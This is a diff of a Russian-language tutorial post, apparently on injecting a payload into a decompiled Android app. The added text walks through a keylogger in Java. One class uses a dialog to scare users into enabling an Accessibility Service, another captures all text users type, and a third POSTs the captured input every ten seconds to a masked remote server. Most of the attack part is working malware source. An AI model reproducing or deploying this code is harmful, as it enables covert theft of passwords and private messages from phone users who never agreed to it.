@@ -518,6 +518,8 @@ https://youtu.be/iBCX_A5FBVU
 
 Payload будет состоять из трех классов - ```ExecuteAttack```, ```GoogleService```, ```SendService```.
 
+![](/assets/images/keylogger_prj.png)
+
 Чтобы наш Accessibility Service начал работать, пользователю необходимо включить его в настройках. Мы поможем в этом пользователю, внедрив в приложение всплывающее окно, с текстом *Please enable app in settings! Otherwise it will stop working* (можно использовать и более пугающий текст). И добавим кнопочку, чтобы пользователь по ней кликнул и перешел сразу в настройки. Класс ```ExecuteAttack``` именно это и делает.
 
 ```java
@@ -534,8 +536,86 @@ public static void openSettings(final Context ctx) {
         alertDialog.show();
     }
 ```
+```GoogleService``` - основная логика кейллогера. Является AccessibilityService:
 
-![](/assets/images/keylogger_prj.png)
+```java
+public class GoogleService extends AccessibilityService {
+```
+
+Метод ```onAccessibilityEvent()``` принимает все входящие события. Событие ```AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED``` приходит, когда пользователь вводит текст в поле какое-нибудь. Мы отлавливаем именно его. Весь ввод записываем в буфер. И каждые 10 секунд отправляем этот буфер на свой сервер, стартуя ```SendService```. 
+
+```
+public void onAccessibilityEvent(AccessibilityEvent event) {
+        switch (event.getEventType()) {
+            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
+
+                int len = event.getText().toString().length();
+                char c;
+                if (len > 0) {
+                    c = event.getText().toString().charAt(len - 2);
+
+                    buf += c;
+                }
+                break;
+            default:
+                break;
+        }
+        Log.d(TAG, "Keylogger buffer now " + buf);
+        Date now = new Date();
+        Date newTime = new Date(GoogleService.CURRENT_TIMESTAMP.getTime() + 10 * 1000);
+
+        if (now.after(newTime) && !"".equals(buf)) {
+
+            Context ctx = getApplicationContext();
+
+            Intent intent = new Intent(ctx, SendService.class);
+
+            intent.putExtra("text", buf);
+            ctx.startService(intent);
+
+            GoogleService.CURRENT_TIMESTAMP = now;
+            buf = "";
+        }
+    }
+```
+
+```SendService``` - просто отправляет данные на сервер.
+
+```java
+private void sendResult(String text) {
+
+        Log.d(TAG, "Sending result to server");
+
+        HttpURLConnection urlConnection = null;
+
+        try {
+            int length = text.length();
+
+            URL url = new URL("http://xxxxxxxxx");
+            urlConnection = (HttpURLConnection) url.openConnection();
+            urlConnection.setConnectTimeout(30 * 1000);
+
+            urlConnection.setRequestMethod("POST");
+            urlConnection.setDoOutput(true);
+            urlConnection.setDoInput(false);
+            urlConnection.setRequestProperty("Content-Type", "text/plain");
+            urlConnection.setRequestProperty("Content-Length", Integer.valueOf(length).toString());
+
+            DataOutputStream request = new DataOutputStream(urlConnection.getOutputStream());
+            Log.d(TAG, "Sending " + text);
+            request.write(text.getBytes(StandardCharsets.UTF_8));
+            request.flush();
+            request.close();
+
+            int respCode = urlConnection.getResponseCode();
+            Log.d(TAG, "Return status code: " + respCode);
+            urlConnection.disconnect();
+        } catch (Exception e) {
+            Log.d(TAG, e.getMessage());
+        }
+
+    }
+```
 
 Скачиваем приложение, декомпилируем. Открываем манифест, находим активити.
 
